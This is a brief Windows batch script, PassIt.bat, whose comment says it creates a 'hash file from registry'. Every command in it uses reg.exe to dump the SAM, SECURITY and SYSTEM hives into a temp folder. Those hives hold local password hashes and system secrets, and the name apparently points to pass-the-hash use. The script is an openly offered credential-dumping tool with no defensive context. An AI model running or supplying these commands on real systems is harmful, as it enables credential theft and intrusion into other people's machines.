::PassIt.bat
::Create Hash File from registry 
::
::Created by Jan De Smet
::
::Change Log
::-----------
::V1.0 Initial release 18-08-2016
::############################################
@echo off
reg.exe save hklm\sam c:\temp\Logs\sam.hiv
reg.exe save hklm\security c:\temp\Logs\security.hiv
reg.exe save hklm\system c:\temp\Logs\system.hiv

